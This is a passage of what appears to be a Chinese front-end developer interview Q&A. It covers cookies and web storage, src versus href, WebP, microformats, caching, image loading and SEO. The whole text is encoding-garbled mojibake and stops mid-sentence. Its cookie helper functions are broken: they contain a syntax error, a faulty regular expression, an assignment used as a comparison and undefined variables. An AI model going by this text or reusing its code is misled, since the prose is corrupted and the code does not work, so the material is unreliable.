æ­¤é™¤äº†ä¿®å¤è¾ƒå¤§çš„é”™è¯¯ä¹‹å¤–ï¼Œå…¶ä»–çš„å·®å¼‚å°†è¢«ç›´æŽ¥å¿½ç•¥ã€‚ â€œæ¸è¿›å¢žå¼ºâ€è§‚ç‚¹ â€œæ¸è¿›å¢žå¼ºâ€è§‚ç‚¹åˆ™è®¤ä¸ºåº”å…³æ³¨äºŽå†…å®¹æœ¬èº« å†…å®¹æ˜¯æˆ‘ä»¬å»ºç«‹ç½‘ç«™çš„è¯±å› ã€‚æœ‰çš„ç½‘ç«™å±•ç¤ºå®ƒï¼Œæœ‰çš„åˆ™æ”¶é›†å®ƒï¼Œæœ‰ç‚¹å¯»æ±‚ï¼Œæœ‰çš„æ“ä½œï¼Œè¿˜æœ‰çš„ç½‘ç«™ç”šè‡³ä¼šåŒ…å«ä»¥ä¸Šçš„ç§ç§ï¼Œä½†ç›¸åŒç‚¹æ˜¯å®ƒä»¬å…¨éƒ½æ¶‰åŠåˆ°äº†å†…å®¹ã€‚è¿™ä½¿å¾—â€œæ¸è¿›å¢žå¼ºâ€œæˆä¸ºäº†ä¸€ç§æ›´ä¸ºåˆç†çš„è®¾è®¡èŒƒä¾‹ã€‚è¿™ä¹Ÿæ˜¯å®ƒç«‹å³è¢« Yahoo! æ‰€é‡‡çº³å¹¶ç”¨ä»¥æž„å»ºå…¶â€åˆ†çº§å¼æµè§ˆå™¨æ”¯æŒâ€œç­–ç•¥çš„åŽŸå› æ‰€åœ¨ å¯ä»¥åˆ©ç”¨å¤šä¸ªåŸŸåæ¥å­˜å‚¨ç½‘ç«™èµ„æºä¼šæ›´æœ‰æ•ˆï¼Ÿ CDN ç¼“å­˜æ›´æ–¹ä¾¿ çªç ´æµè§ˆå™¨å¹¶å‘é™åˆ¶ èŠ‚çº¦ cookie å¸¦å®½ èŠ‚çº¦ä¸»åŸŸåçš„è¿žæŽ¥æ•°ï¼Œä¼˜åŒ–é¡µé¢å“åº”é€Ÿåº¦ é˜²æ­¢ä¸å¿…è¦çš„å®‰å…¨é—®é¢˜ å¯¹ç½‘é¡µæ ‡å‡†å’Œæ ‡å‡†åˆ¶å®šæœºæž„é‡è¦æ€§çš„ç†è§£ç½‘é¡µæ ‡å‡†å’Œæ ‡å‡†åˆ¶å®šæœºæž„éƒ½æ˜¯ä¸ºäº†èƒ½è®© web å‘å±•çš„æ›´ â€œå¥åº·â€ï¼Œå¼€å‘è€…éµå¾ªäº†ç»Ÿä¸€çš„æ ‡å‡†ï¼Œé™ä½Žå¼€å‘éš¾åº¦ï¼Œå¼€å‘æˆæœ¬ï¼ŒSEO ä¹Ÿä¼šæ›´å¥½åšï¼Œä¹Ÿä¸ä¼šå› ä¸ºæ»¥ç”¨ä»£ç å¯¼è‡´å„ç§ BUG ã€å®‰å…¨é—®é¢˜,æœ€ç»ˆæé«˜ç½‘ç«™æ˜“ç”¨æ€§ã€‚ æè¿°ä¸€ä¸‹ cookiesï¼ŒsessionStorage å’Œ localStorage çš„åŒºåˆ«sessionStorage ï¼ˆsessionï¼‰ä¸­çš„æ•°æ®ï¼Œè¿™äº›æ•°æ®åªæœ‰åœ¨åŒä¸€ä¸ªä¼šè¯ä¸­çš„é¡µé¢æ‰èƒ½è®¿é—®å¹¶ä¸”å½“ä¼šè¯ç»“æŸåŽæ•°æ®ä¹Ÿéšä¹‹é”€æ¯ã€‚å› ä¸º sessionStorage ä¸æ˜¯ä¸€ç§æŒä¹…åŒ–çš„æœ¬åœ°å­˜å‚¨ï¼Œä»…ä»…æ˜¯ä¼šè¯çº§åˆ«çš„å­˜å‚¨ã€‚è€Œ localStorage ç”¨äºŽæŒä¹…åŒ–çš„æœ¬åœ°å­˜å‚¨ï¼Œé™¤éžä¸»åŠ¨åˆ é™¤æ•°æ®ï¼Œå¦åˆ™æ•°æ®æ˜¯æ°¸è¿œä¸ä¼šè¿‡æœŸçš„ã€‚ web storage å’Œ cookie çš„åŒºåˆ« Web Storage çš„æ¦‚å¿µå’Œ cookie ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯å®ƒæ˜¯ä¸ºäº†æ›´å¤§å®¹é‡å­˜å‚¨è®¾è®¡çš„ã€‚Cookie çš„å¤§å°æ˜¯å—é™çš„ï¼Œå¹¶ä¸”æ¯æ¬¡ä½ è¯·æ±‚ä¸€ä¸ªæ–°çš„é¡µé¢çš„æ—¶å€™ Cookie éƒ½ä¼šè¢«å‘é€è¿‡åŽ»ï¼Œè¿™æ ·æ— å½¢ä¸­æµªè´¹äº†å¸¦å®½ï¼Œå¦å¤– cookie è¿˜éœ€è¦æŒ‡å®šä½œç”¨åŸŸï¼Œä¸å¯ä»¥è·¨åŸŸè°ƒç”¨ã€‚ é™¤æ­¤ä¹‹å¤–ï¼ŒWeb Storage æ‹¥æœ‰ setItem,getItem,removeItemï¼Œclean ç­‰æ–¹æ³•ï¼Œä¸åƒ cookie éœ€è¦å‰ç«¯å¼€å‘è€…è‡ªå·±å°è£… setCookie,getCookieï¼Œä½†æ˜¯ Cookie ä¹Ÿä¸æ˜¯ä¸å¯ä»¥æˆ–ç¼ºçš„ï¼šCookie çš„ä½œç”¨æ˜¯ä¸ŽæœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œä½œä¸º HTTP è§„èŒƒçš„ä¸€éƒ¨åˆ†å­˜åœ¨ï¼Œè€Œ Web Storage ä»…ä»…æ˜¯ä¸ºäº†åœ¨æœ¬åœ°â€œå­˜å‚¨â€æ•°æ®è€Œç”Ÿã€‚ å‰ç«¯è®¾ç½®ç”¨æˆ·è®¾ç½®ï¼ŒèŽ·å–ï¼Œæ¸…ç©º Cookie 1234567891011121314151617181920212223242526// å†™ cookies function setCookie()&#123; var Days = 30; var exp = new Date(); exp.setTime(exp.getTime() + Days*24*60*60*1000); document.cookie = name + "=" + encodeURIComponent(value) + "ï¼›expires=" + exp.toGMTString();&#125;// è¯»å– cookiesfunction getCookie(name)&#123; var arr,reg = new RegExp("(^|)" + name + "+([^;]*)(;|$)"); if(arr.document.cookie.match(reg) return decodeURIComponent(arr[2]); else return null;&#125;//åˆ é™¤ cookiesfunction delCookie(name)&#123; var exp = new Date(); exp.setTime(exp.getTime() - 1); var cval = getCookie(name); if(!cval = null)&#123; document.cookie = name + "=" + cval + ";expires" + exp.toGMTString(); &#125;&#125; ç®€è¿°ä¸€ä¸‹ src ä¸Ž href çš„åŒºåˆ«src ç”¨äºŽæ›¿æ¢å½“å‰å…ƒç´ ï¼Œ href ç”¨äºŽåœ¨å½“å‰æ–‡æ¡£å’Œåº”ç”¨èµ„æºä¹‹é—´å»ºç«‹è”ç³»ã€‚ src æ˜¯ srouce çš„ç¼©å†™ï¼ŒæŒ‡å‘å¤–éƒ¨èµ„æºçš„ä½ç½®ï¼ŒæŒ‡å‘çš„å†…å®¹å’Œå°†ä¼šåµŒå…¥åˆ°æ–‡æ¡£ä¸­å½“å‰æ ‡ç­¾æ‰€åœ¨ä½ç½®ï¼Œåœ¨è¯·æ±‚ src èµ„æºæ—¶ä¼šå°†å…¶æŒ‡å‘çš„èµ„æºä¸‹è½½å¹¶åº”ç”¨åˆ°æ–‡æ¡£å†…ï¼Œä¾‹å¦‚ js è„šæœ¬ï¼Œimg å›¾ç‰‡å’Œframe ç­‰å…ƒç´ ã€‚ 1&lt;script src = "js.js"&gt;&lt;/script&gt; å½“æµè§ˆå™¨è§£æžåˆ°è¯¥å…ƒç´ æ—¶ï¼Œä¼šæš‚åœå…¶ä»–èµ„æºçš„ä¸‹è½½å’Œå¤„ç†ï¼Œç›´åˆ°å°†è¯¥èµ„æºåŠ è½½ã€ç¼–è¯‘ã€æ‰§è¡Œå®Œæ¯•ï¼Œå›¾ç‰‡å’Œæ¡†æž¶ç­‰å…ƒç´ ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œç±»ä¼¼äºŽå°†æ‰€æŒ‡å‘èµ„æºåµŒå…¥å½“å‰æ ‡ç­¾å†…ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå°†jsè„šæœ¬æ”¾åœ¨åº•éƒ¨è€Œä¸æ˜¯å¤´éƒ¨ã€‚ href æ˜¯ Hypertext Reference çš„ç¼©å†™ï¼ŒæŒ‡å‘ç½‘ç»œèµ„æºæ‰€åœ¨çš„ä½ç½®ï¼Œå»ºç«‹å’Œå½“å‰å…ƒç´ ï¼ˆé”šç‚¹ï¼‰æˆ–å½“å‰æ–‡æ¡£ï¼ˆé“¾æŽ¥ï¼‰ä¹‹é—´çš„é“¾æŽ¥ï¼Œå¦‚æžœåœ¨æ–‡æ¡£ä¸­æ·»åŠ  1&lt;link href = "common.css" rel="stylesheet"/&gt; é‚£ä¹ˆæµè§ˆå™¨ä¼šè¯†åˆ«è¯¥æ–‡æ¡£ä¸º css æ–‡ä»¶ï¼Œå°±ä¼šå¹¶è¡Œä¸‹è½½èµ„æºå¹¶ä¸”ä¸ä¼šåœæ­¢å¯¹å½“å‰æ–‡æ¡£çš„å¤„ç†ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå»ºè®®ä½¿ç”¨link æ–¹å¼æ¥åŠ è½½ css,ä¹Ÿä¸æ˜¯ä½¿ç”¨ @import æ–¹å¼ ç½‘é¡µåˆ¶ä½œä¼šç”¨åˆ°çš„å›¾ç‰‡æ ¼å¼æœ‰å“ªäº›ï¼Ÿpng-8,png-24,jpeg,gif,svg å¸Œæœ›å¬åˆ°çš„æ˜¯ Webp(æ˜¯å¦æœ‰å…³æ³¨æ–°é²œæŠ€æœ¯)ï¼ŒWebP,è°·æ­Œå¼€å‘çš„ä¸€ç§æ—¨åœ¨åŠ å¿«å›¾ç‰‡åŠ è½½é€Ÿåº¦çš„å›¾ç‰‡æ ¼å¼ã€‚å›¾ç‰‡åŽ‹ç¼©ä½“ç§¯å¤§çº¦åªæœ‰ JPEG çš„ 2/3 ï¼Œå¹¶èƒ½èŠ‚çœå¤§é‡çš„æœåŠ¡å™¨å¸¦å®½èµ„æºå’Œæ•°æ®ç©ºé—´ã€‚Facebook Ebay ç­‰çŸ¥åç½‘ç«™å·²ç»å¼€å§‹æµ‹è¯•å¹¶ä½¿ç”¨ WebP æ ¼å¼ã€‚åœ¨è´¨é‡ç›¸åŒçš„æƒ…å†µä¸‹ï¼ŒWebPæ ¼å¼å›¾åƒçš„ä½“ç§¯è¦æ¯” JPEG æ ¼å¼å›¾åƒå° 40% æ”¯æŒæƒ…å†µï¼šè°·æ­Œæµè§ˆå™¨å·²ç»æ”¯æŒwebpæ ¼å¼ï¼ŒOperaåœ¨ç‰ˆæœ¬å·Opera11.10åŽä¹Ÿå¢žåŠ äº†æ”¯æŒï¼Œç„¶è€Œç«ç‹å’Œieæš‚æ—¶è¿˜ä¸æ”¯æŒwebpæ ¼å¼ï¼Œå¯ä»¥é‡‡ç”¨flashæ’ä»¶æ¥æ˜¾ç¤ºwebpï¼Œå½“ç„¶è¿™æ ·ä¼šè€—è´¹ä¸€äº›æ€§èƒ½ã€‚ ç¾Žä¸­ä¸è¶³çš„æ˜¯ï¼ŒWebPæ ¼å¼å›¾åƒçš„ç¼–ç æ—¶é—´â€œæ¯”JPEGæ ¼å¼å›¾åƒé•¿8å€â€ã€‚ è¯¦ç»†å¯ä»¥ç‚¹å‡» éƒ½è¯´ WebP åŽ‰å®³ï¼Œç©¶ç«ŸåŽ‰å®³åœ¨å“ªé‡Œï¼Ÿ çŸ¥é“ä»€ä¹ˆæ˜¯å¾®æ ¼å¼(microformat)ï¼Ÿè°ˆè°ˆç†è§£ï¼Œåœ¨å‰ç«¯æž„å»ºä¸­åº”è¯¥è€ƒè™‘å¾®æ ¼å¼å—ï¼Ÿå¾®æ ¼å¼ï¼ˆMicroformatsï¼‰ æ˜¯ä¸€ç§è®©æœºå™¨å¯è¯»çš„è¯­ä¹‰åŒ– XHTML è¯æ±‡çš„é›†åˆï¼Œæ˜¯ç»“æž„åŒ–æ•°æ®çš„å¼€æ”¾æ ‡å‡†ã€‚æ˜¯ä¸ºç‰¹æ®Šåº”ç”¨è€Œåˆ¶å®šçš„ç‰¹æ®Šæ ¼å¼ã€‚ ä¼˜ç‚¹ï¼šå°†æ™ºèƒ½æ•°æ®æ·»åŠ åˆ°ç½‘é¡µä¸Šï¼Œè®©ç½‘ç«™å†…å®¹åœ¨æœç´¢å¼•æ“Žç»“æžœç•Œé¢å¯ä»¥æ˜¾ç¤ºé¢å¤–çš„æç¤ºã€‚ï¼ˆåº”ç”¨èŒƒä¾‹ï¼šè±†ç“£ï¼‰ å¾®æ ¼å¼åœ¨å®žé™…åº”ç”¨ä¸­çš„æ„ä¹‰å’Œä½œç”¨ åœ¨æ‰å–Webå†…å®¹æ—¶ï¼Œèƒ½å¤Ÿæ›´ä¸ºå‡†ç¡®åœ°è¯†åˆ«å†…å®¹å—çš„è¯­ä¹‰ï¼› å¯¹å†…å®¹è¿›è¡Œæ“ä½œï¼ŒåŒ…æ‹¬æä¾›è®¿é—®ã€æ ¡å¯¹ï¼Œè¿˜å¯ä»¥å°†å…¶è½¬åŒ–æˆå…¶ä»–çš„ç›¸å…³æ ¼å¼ï¼Œæä¾›ç»™å¤–éƒ¨ç¨‹åºå’ŒWebæœåŠ¡ä½¿ç”¨ å®žä¾‹ï¼š 1234// ä»¥å‰å†™é“¾æŽ¥åˆ°é¦–é¡µçš„ä»£ç &lt;a href = "http://laibh.top"&gt;èµ–åŒå­¦&lt;/a&gt;// çŽ°åœ¨ä¸ºaæ ‡ç­¾åŠ ä¸Šrelå±žæ€§,æ ‡è®°aåŒ…æ‹¬rel=â€homepageâ€å±žæ€§ï¼Œè¯¥å±žæ€§æ˜¾ç¤ºé“¾æŽ¥çš„ç›®æ ‡é¡µé¢æ˜¯è¯¥ç½‘ç«™çš„é¦–é¡µã€‚é€šè¿‡ä¸ºå·²æœ‰çš„é“¾æŽ¥å…ƒç´ æ·»åŠ è¯­ä¹‰åŒ–å±žæ€§ï¼Œå°±ä¸ºè¿™ä¸ªé“¾æŽ¥æ·»åŠ äº†å…·ä½“çš„ç»“æž„å’Œæ„ä¹‰ã€‚&lt;a href = "http://laibh.top" rel = "homepage"&gt;èµ–åŒå­¦&lt;/a&gt; hCard å¾®æ ¼å¼hCardæ˜¯ä¸€ç§å¾®æ ¼å¼ï¼Œç”¨æ¥å‘å¸ƒä¸ªäººï¼Œå…¬å¸ï¼Œç»„ç»‡ï¼Œåœ°ç‚¹ç­‰è¯¦ç»†çš„è”ç³»ä¿¡æ¯ã€‚ å®ƒå¯ä»¥ä½¿åˆ†æžå™¨ï¼ˆæ¯”å¦‚å…¶ä»–ç½‘ç«™ï¼ŒFirefoxçš„Operatoræ’ä»¶ï¼‰èŽ·å¾—è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¹¶é€šè¿‡åˆ«çš„ç½‘ç«™æˆ–è€…åœ°å›¾å·¥å…·è¿›è¡Œæ˜¾ç¤ºï¼Œæˆ–è€…è½½å…¥åˆ°åœ°å€ç°¿ç­‰å…¶ä»–ç¨‹åºã€‚ å®žä¾‹ï¼š 1234567891011121314&lt;div&gt; &lt;div&gt;èµ–åŒå­¦&lt;/div&gt; &lt;div&gt;æŸæŸå…¬å¸&lt;/div&gt; &lt;div&gt;ç”µè¯ï¼šxxx-xxx-xxx&lt;/div&gt; &lt;a href = "http://laibh.top"&gt;èµ–åŒå­¦çš„ç½‘ç«™&lt;a&gt;&lt;/div&gt; // åŠ å…¥å¾®æ ¼å¼åŽ &lt;div class = "vcard"&gt; &lt;div class = "fn"&gt;èµ–åŒå­¦&lt;/div&gt; &lt;div class = "org"&gt;æŸæŸå…¬å¸&lt;/div&gt; &lt;div class = "tel"&gt;ç”µè¯ï¼šxxx-xxx-xxx&lt;/div&gt; &lt;a class = "url" href = "http://laibh.top"&gt;èµ–åŒå­¦çš„ç½‘ç«™&lt;a&gt;&lt;/div&gt; è¿™é‡Œï¼Œæ­£å¼åç§°ï¼ˆclass=â€fnâ€ï¼‰ï¼Œç»„ç»‡ï¼ˆclass=â€orgâ€ï¼‰ï¼Œç”µè¯å·ç ï¼ˆclass=â€telâ€ï¼‰å’Œurlï¼ˆclass=â€urlâ€ï¼‰åˆ†åˆ«ç”¨ç›¸åº”çš„classæ ‡ç¤ºï¼›åŒæ—¶ï¼Œæ‰€æœ‰å†…å®¹éƒ½åŒ…å«åœ¨class=â€vcardâ€é‡Œã€‚ ç›®å‰çœ‹æ¥ï¼Œè¿™ä¼¼ä¹Žæ˜¯ä¸€ä»¶è´¹åŠ›ä¸è®¨å¥½çš„äº‹æƒ…ï¼Œå› ä¸º hCard ç­‰å¾®æ ¼å¼å°šæœªå¾—åˆ°æµè§ˆå™¨å’Œç»ˆç«¯è®¾å¤‡çš„è‰¯å¥½æ”¯æŒã€‚ä½†æ˜¯ä¸€æ—¦è¿™äº›ä¸è¶³å¾—åˆ°äº†æ”¹å–„ï¼ŒhCard å°±ä¼šä¸ºæˆ‘ä»¬çš„æ•°å­—ç”Ÿæ´»å¸¦æ¥å¾ˆå¤§çš„ä¾¿åˆ©ã€‚ åœ¨ css/js ä»£ç ä¸Šçº¿åŽä¹‹åŽå¼€å‘äººå‘˜ç»å¸¸ä¼šä¼˜åŒ–æ€§èƒ½ï¼Œä»Žç”¨æˆ·åˆ·æ–°ç½‘é¡µå¼€å§‹ï¼Œä¸€æ¬¡ js è¯·æ±‚ä¸€èˆ¬æƒ…å†µä¸‹æœ‰å“ªäº›åœ°æ–¹ä¼šæœ‰ç¼“å­˜å¤„ç†ï¼Ÿdnsç¼“å­˜ï¼šçŸ­æ—¶é—´å†…å¤šæ¬¡è®¿é—®æŸä¸ªç½‘ç«™ï¼Œåœ¨é™å®šæ—¶é—´å†…ï¼Œä¸ç”¨å¤šæ¬¡è®¿é—®DNSæœåŠ¡å™¨ã€‚ cdnç¼“å­˜ï¼šå†…å®¹åˆ†å‘ç½‘ç»œ æµè§ˆå™¨ç¼“å­˜ï¼šæµè§ˆå™¨åœ¨ç”¨æˆ·ç£ç›˜ä¸Šï¼Œå¯¹æœ€æ–°è¯·æ±‚è¿‡çš„æ–‡æ¡£è¿›è¡Œäº†å­˜å‚¨ã€‚ æœåŠ¡å™¨ç¼“å­˜ï¼šå°†éœ€è¦é¢‘ç¹è®¿é—®çš„Webé¡µé¢å’Œå¯¹è±¡ä¿å­˜åœ¨ç¦»ç”¨æˆ·æ›´è¿‘çš„ç³»ç»Ÿä¸­ï¼Œå½“å†æ¬¡è®¿é—®è¿™äº›å¯¹è±¡çš„æ—¶å€™åŠ å¿«äº†é€Ÿåº¦ã€‚ å¦å¤– ï¼Œå…³äºŽæ›´æ–°å‘å¸ƒCSSå’ŒJSæ–‡ä»¶çš„ç¼“å­˜é—®é¢˜ ä¸Šæ–‡å¤§æ¦‚è§£å†³çš„æ€è·¯ï¼šjsæ–‡ä»¶çš„å†…å®¹ä¿®æ”¹äº†,å¯ä»¥åŠ ä¸ªtå‚æ•°è¡¨æ˜Žä¸€ä¸‹æ—¥æœŸ,ç”¨è¿™ä¸ªæ—¥æœŸæ¥ä½œä¸ºç‰ˆæœ¬å·ï¼Œçœ‹åˆ°æ—¥æœŸä¹Ÿèƒ½çŸ¥é“æ˜¯å“ªå¤©å‘å¸ƒçš„ï¼Œæ²¡æœ‰ä¿®æ”¹jsæ–‡ä»¶å°±ä¸ç”¨ä¿®æ”¹æ—¥æœŸã€‚ ä¸€ä¸ªé¡µé¢ä¸Šæœ‰å¤§é‡å›¾ç‰‡ï¼ˆå¤§åž‹ç”µå•†ç½‘ç«™ï¼‰ï¼ŒåŠ è½½å¾ˆæ…¢ï¼Œæœ‰å“ªäº›æ–¹æ³•ä¼˜åŒ–è¿™äº›å›¾ç‰‡çš„åŠ è½½ï¼Œç»™ç”¨æˆ·æ›´å¥½çš„ä½“éªŒå›¾ç‰‡æ‡’åŠ è½½ï¼Œåœ¨é¡µé¢ä¸Šçš„æœªå¯è§†åŒºåŸŸæ·»åŠ ä¸€ä¸ªæ»šåŠ¨äº‹ä»¶ï¼Œåˆ¤æ–­å›¾ç‰‡ä½ç½®ä¸Žæµè§ˆå™¨é¡¶ç«¯çš„è·ç¦»ä¸Žé¡µé¢è·ç¦»ï¼Œå¦‚æžœå‰è€…å°äºŽåŽè€…ï¼Œä¼˜å…ˆåŠ è½½ å¦‚æžœä¸ºå¹»ç¯ç‰‡ã€ç›¸å†Œç­‰ï¼Œå¯ä»¥ä½¿ç”¨å›¾ç‰‡é¢„åŠ è½½æŠ€æœ¯ï¼Œå°†å½“æœŸçš„å±•ç¤ºå›¾ç‰‡çš„å‰ä¸€å¼ å’ŒåŽä¸€å¼ ä¼˜å…ˆåŠ è½½ã€‚ å¦‚æžœå›¾ç‰‡ä¸ºcsså›¾ç‰‡ã€‚å¯ä»¥ä½¿ç”¨ CSSsprite,SVGsprite,Iconfont,Base64ç­‰æŠ€æœ¯ã€‚ å¦‚æžœå›¾ç‰‡è¿‡å¤§ï¼Œå¯ä»¥ä½¿ç”¨ç‰¹æ®Šç¼–ç çš„å›¾ç‰‡ï¼ŒåŠ è½½æ—¶ä¼šå…ˆåŠ è½½ä¸€å¼ åŽ‹ç¼©çš„ç‰¹åˆ«åŽ‰å®³çš„ç¼©ç•¥å›¾ï¼Œä»¥æé«˜ç”¨æˆ·ä½“éªŒã€‚ å¦‚æžœå›¾ç‰‡å±•ç¤ºåŒºåŸŸå°äºŽå›¾ç‰‡çš„çœŸå®žå¤§å°ï¼Œåˆ™å› åœ¨æœåŠ¡ç«¯æ ¹æ®ä¸šåŠ¡éœ€è¦å…ˆè¿›è¡Œå›¾ç‰‡åŽ‹ç¼©ï¼Œå›¾ç‰‡åŽ‹ç¼©åŽå¤§å°ä¸Žå±•ç¤ºä¸€è‡´ã€‚ å¦‚æžœåŽ»ç†è§£ HTML ç»“æž„çš„è¯­ä¹‰åŒ– ä¸ºäº†åŽ»æŽ‰æˆ–æ ·å¼ä¸¢å¤±çš„æ—¶å€™èƒ½è®©é¡µé¢å‘ˆçŽ°æ¸…æ™°çš„ç»“æž„ å±å¹•é˜…è¯»å™¨ï¼ˆå¦‚æžœè®¿å®¢æœ‰è§†éšœï¼‰ä¼šå®Œå…¨æ ¹æ®ä½ çš„æ ‡è®°æ¥â€œè¯»â€ä½ çš„ç½‘é¡µ. PDA/æ‰‹æœºç­‰è®¾å¤‡å¯èƒ½æ— æ³•åƒæ™®é€šç”µè„‘çš„æµè§ˆå™¨ä¸€æ ·æ¥æ¸²æŸ“ç½‘é¡µï¼ˆé€šå¸¸æ˜¯å› ä¸ºè¿™äº›è®¾å¤‡å¯¹cssæ”¯æŒè¾ƒå¼±ï¼‰ æœç´¢å¼•æ“Žçš„çˆ¬è™«ä¹Ÿä¾èµ–äºŽæ ‡è®°æ¥ç¡®å®šä¸Šä¸‹æ–‡å’Œå„ä¸ªå…³é”®å­—çš„æƒé‡ï¼Œæœ‰åˆ©äºŽSEOï¼Œå’Œæœç´¢å¼•æ“Žå»ºç«‹è‰¯å¥½æ²Ÿé€š ä¾¿äºŽå›¢é˜Ÿå¼€å‘å’Œç»´æŠ¤ã€‚éµå¾ªW3Cæ ‡å‡†çš„å›¢é˜Ÿï¼Œå¯ä»¥å‡å°‘å¾ˆå¤šå·®å¼‚åŒ–çš„ä¸œè¥¿ï¼Œæ–¹ä¾¿å¼€å‘ç»´æŠ¤ï¼Œæé«˜æ•ˆçŽ‡ï¼Œç”šè‡³å®žçŽ°æ¨¡å—åŒ–å¼€å‘ã€‚ ä»¥å‰ç«¯è§’åº¦å‡ºå‘åšå¥½SEO éœ€è¦è€ƒè™‘ä»€ä¹ˆï¼Ÿäº†è§£æœç´¢å¼•æ“Žå¦‚ä½•æŠ“å–ç½‘é¡µå’Œå¦‚ä½•ç´¢å¼•ç½‘é¡µ éœ€è¦çŸ¥é“ä¸€äº›æœç´¢å¼•æ“Žçš„åŸºæœ¬å·¥ä½œåŽŸç†ï¼Œå„ä¸ªæœç´¢å¼•æ“Žä¹‹é—´çš„åŒºåˆ«ï¼Œæœç´¢æœºå™¨äººï¼ˆSEO robot æˆ–å« web crawlerï¼‰å¦‚ä½•è¿›è¡Œå·¥ä½œï¼Œæœç´¢å¼•æ“Žå¦‚ä½•å¯¹æœç´¢ç»“æžœè¿›è¡ŒæŽ’åºç­‰ç­‰ã€‚ Metaæ ‡ç­¾è¯­ä¹‰åŒ–ä¸»è¦åŒ…æ‹¬ä¸»é¢˜ï¼ˆTitleï¼‰,ç½‘ç«™æè¿°ï¼ˆDescriptionï¼‰å’Œå…³é”®è¯ï¼ˆKeywordsï¼‰ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–éšè—æ–‡å­—æ¯”å¦‚ä½œè€…ï¼ˆAuThorï¼‰,ç›®å½•ï¼ˆCategoryï¼‰,ç¼–ç è¯­ç§ï¼ˆLanguageï¼‰ç­‰ å¦‚ä½•é€‰æ‹©å…³é”®è¯å¹¶åœ¨ç½‘é¡µä¸­æ”¾ç½®å…³é”®è¯æœç´¢å°±å¾—ç”¨å…³é”®è¯ï¼Œå…³é”®è¯åˆ†æžå’Œé€‰æ‹©æ˜¯SEOçš„æœ€é‡è¦çš„å·¥ä½œä¹‹ä¸€ï¼Œé¦–å…ˆè¦ç»™ç½‘ç«™ç¡®å®šä¸»å…³é”®è¯ï¼ˆä¸€èˆ¬æ˜¯5ä¸ªä¸Šä¸‹ï¼‰ï¼Œç„¶åŽé’ˆå¯¹è¿™äº›å…³é”®è¯è¿›è¡Œä¼˜åŒ–ï¼ŒåŒ…æ‹¬å…³é”®è¯å¯†åº¦ï¼ˆDensityï¼‰ï¼Œç›¸å…³åº¦ï¼ˆRelavancyï¼‰ï¼Œçªå‡ºæ€§ï¼ˆProminencyï¼‰ç­‰ç­‰ã€‚ äº†è§£ä¸»è¦çš„æœç´¢å¼•æ“Žè™½ç„¶æœç´¢å¼•æ“Žæœ‰å¾ˆå¤šï¼Œä½†æ˜¯å¯¹ç½‘ç«™æµé‡èµ·å†³å®šä½œç”¨çš„å°±é‚£ä¹ˆå‡ ä¸ªã€‚æ¯”å¦‚è‹±æ–‡çš„ä¸»è¦æœ‰Googleï¼ŒYahooï¼ŒBing ç­‰ï¼›ä¸­æ–‡çš„æœ‰ç™¾åº¦ï¼Œæœç‹—ï¼Œæœ‰é“ç­‰ã€‚ä¸åŒçš„æœç´¢å¼•æ“Žå¯¹é¡µé¢çš„æŠ“å–å’Œç´¢å¼•ã€æŽ’åºçš„è§„åˆ™éƒ½ä¸ä¸€æ ·ã€‚è¿˜è¦äº†è§£å„æœç´¢é—¨æˆ·å’Œæœç´¢å¼•æ“Žä¹‹é—´çš„å…³ç³»ï¼Œæ¯”å¦‚ AOL ç½‘é¡µæœç´¢ç”¨çš„æ˜¯ Google çš„æœç´¢æŠ€æœ¯ï¼ŒMSN ç”¨çš„æ˜¯ Bing çš„æŠ€æœ¯ã€‚ ä¸»è¦çš„äº’è”ç½‘ç›®å½•Open Directory è‡ªèº«ä¸æ˜¯æœç´¢å¼•æ“Žï¼Œè€Œæ˜¯ä¸€ä¸ªå¤§åž‹çš„ç½‘ç«™ç›®å½•ï¼Œä»–å’Œæœç´¢å¼•æ“Žçš„ä¸»è¦åŒºåˆ«æ˜¯ç½‘ç«™å†…å®¹çš„æ”¶é›†æ–¹å¼ä¸åŒã€‚ç›®å½•æ˜¯äººå·¥ç¼–è¾‘çš„ï¼Œä¸»è¦æ”¶å½•ç½‘ç«™ä¸»é¡µï¼›æœç´¢å¼•æ“Žæ˜¯è‡ªåŠ¨æ”¶çš„ï¼Œé™¤äº†ä¸»é¡µå¤–è¿˜æŠ“å–å¤§é‡çš„å†…å®¹é¡µé¢ã€‚ æŒ‰ç‚¹å‡»ä»˜è´¹çš„æœç´¢å¼•æ“Žæœç´¢å¼•æ“Žä¹Ÿéœ€è¦ç”Ÿå­˜ï¼Œéšç€äº’è”ç½‘å•†åŠ¡çš„è¶Šæ¥è¶Šæˆç†Ÿï¼Œæ”¶è´¹çš„æœç´¢å¼•æ“Žä¹Ÿå¼€å§‹å¤§è¡Œå…¶é“ã€‚æœ€å…¸åž‹çš„æœ‰ Overture å’Œç™¾åº¦ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬ Google çš„å¹¿å‘Šé¡¹ç›® Google Adwordsã€‚è¶Šæ¥è¶Šå¤šçš„äººé€šè¿‡æœç´¢å¼•æ“Žçš„ç‚¹å‡»å¹¿å‘Šæ¥å®šä½å•†ä¸šç½‘ç«™ï¼Œè¿™é‡Œé¢ä¹Ÿå¤§æœ‰ä¼˜åŒ–å’ŒæŽ’åçš„å­¦é—®ï¼Œä½ å¾—å­¦ä¼šç”¨æœ€å°‘çš„å¹¿å‘ŠæŠ•å…¥èŽ·å¾—æœ€å¤šçš„ç‚¹å‡»ã€‚ æœç´¢å¼•æ“Žç™»å½•ç½‘ç«™åšå®Œäº†ä»¥åŽï¼Œåˆ«èººåœ¨é‚£é‡Œç­‰ç€å®¢äººä»Žå¤©è€Œé™ã€‚è¦è®©åˆ«äººæ‰¾åˆ°ä½ ï¼Œæœ€ç®€å•çš„åŠžæ³•å°±æ˜¯å°†ç½‘ç«™æäº¤ï¼ˆsubmitï¼‰åˆ°æœç´¢å¼•æ“Žã€‚å¦‚æžœä½ çš„æ˜¯å•†ä¸šç½‘ç«™ï¼Œä¸»è¦çš„æœç´¢å¼•æ“Žå’Œç›®å½•éƒ½ä¼šè¦æ±‚ä½ ä»˜è´¹æ¥èŽ·å¾—æ”¶å½•ï¼ˆæ¯”å¦‚ Yahoo è¦ 299 